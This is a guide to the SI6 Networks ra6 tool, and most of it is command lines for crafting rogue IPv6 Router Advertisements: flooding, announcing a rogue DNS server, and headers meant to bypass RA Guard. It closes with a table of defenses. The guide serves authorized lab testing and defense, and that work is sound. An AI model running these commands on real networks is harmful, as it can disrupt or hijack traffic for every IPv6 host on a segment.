# How to Use the SI6 Networks ra6 Tool for Router Advertisement Attacks

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: SI6 Networks, Ra6, IPv6, Router Advertisement, Security Testing, ICMPv6

Description: A guide to using the SI6 Networks ra6 tool for testing Router Advertisement handling in authorized lab environments to identify IPv6 security vulnerabilities.

The `ra6` tool from the SI6 Networks IPv6 toolkit crafts and sends ICMPv6 Router Advertisement (RA) messages. RAs are used in IPv6 for SLAAC (Stateless Address Autoconfiguration) and default gateway announcement. `ra6` enables security researchers to test how hosts respond to malformed or malicious RAs in authorized lab environments.

**Warning**: Sending unsolicited Router Advertisements on production networks is illegal and can disrupt all IPv6 hosts on the segment. Only use in isolated lab environments with explicit authorization.

## Installing the SI6 Networks Toolkit

```bash
sudo apt-get install ipv6toolkit   # Debian/Ubuntu
sudo pacman -S ipv6toolkit          # Arch Linux
```

## Basic ra6 Usage

```bash
# Send a basic Router Advertisement from eth0

sudo ra6 -i eth0

# Send an RA announcing a specific prefix
sudo ra6 -i eth0 -P 2001:db8:cafe::/64

# Send an RA to a specific target (unicast)
sudo ra6 -i eth0 -d fe80::target

# Send an RA to the all-nodes multicast (affects all hosts on segment)
sudo ra6 -i eth0 -d ff02::1
```

## Crafting RA Options

```bash
# Set router lifetime (0 = not a default router)
sudo ra6 -i eth0 --router-lifetime 0

# Set router lifetime to maximum (flood default routes)
sudo ra6 -i eth0 --router-lifetime 65535

# Set hop limit in the RA
sudo ra6 -i eth0 --cur-hop-limit 64

# Include a Recursive DNS Server (RDNSS) option
sudo ra6 -i eth0 --rdnss 2001:db8::53

# Include a DNS Search List (DNSSL) option
sudo ra6 -i eth0 --dnssl "example.com"
```

## Prefix Information Options

```bash
# Announce a prefix with SLAAC flag (A-bit) set
sudo ra6 -i eth0 -P 2001:db8::/64 --prefix-opt-a

# Announce a prefix with on-link flag (L-bit) set
sudo ra6 -i eth0 -P 2001:db8::/64 --prefix-opt-l

# Set prefix valid and preferred lifetime
sudo ra6 -i eth0 -P 2001:db8::/64 --prefix-opt-valid 3600 --prefix-opt-preferred 1800
```

## Testing RA Flood Resilience

```bash
# Send multiple RAs in quick succession to test rate limiting
sudo ra6 -i eth0 -P 2001:db8::/64 --loop --sleep 0

# Send RAs with different prefixes to fill routing tables
# (Use with --loop and varying -P values in a script)

# Test with maximum prefix count per RA
sudo ra6 -i eth0 -P 2001:db8:1::/64 -P 2001:db8:2::/64 -P 2001:db8:3::/64
```

## Testing RA Guard Bypass

RA Guard is a network switch feature that filters unauthorized RAs. `ra6` can test its effectiveness:

```bash
# Send RA with extension headers (may bypass some RA Guard implementations)
sudo ra6 -i eth0 --frag-hdr -P 2001:db8::/64

# Send RA with hop-by-hop header
sudo ra6 -i eth0 --hbh-opt -P 2001:db8::/64
```

## Verifying RA Impact on Hosts

After sending test RAs, verify the effect on target hosts:

```bash
# Check if host accepted the route
ip -6 route show

# Check if host configured addresses from the announced prefix
ip -6 addr show

# Check routing table for new default gateway
ip -6 route show default
```

## Defenses Against Rogue RAs

Understanding the attack enables better defense:

| Defense | Implementation |
|---|---|
| RA Guard (RFC 6105) | Enable on managed switches |
| SEND (RFC 3971) | Cryptographically signed NDP |
| radvd with ACLs | Restrict which interfaces run radvd |
| NDPMon | Monitor for unexpected NDP traffic |
| ip6tables | Block RA from non-router sources |

```bash
# Block incoming RAs with ip6tables (host-based defense)
sudo ip6tables -A INPUT -p icmpv6 --icmpv6-type router-advertisement -j DROP
```

`ra6` is a valuable tool for verifying that your network's RA Guard configuration actually blocks unauthorized Router Advertisements before attackers can exploit the vulnerability.
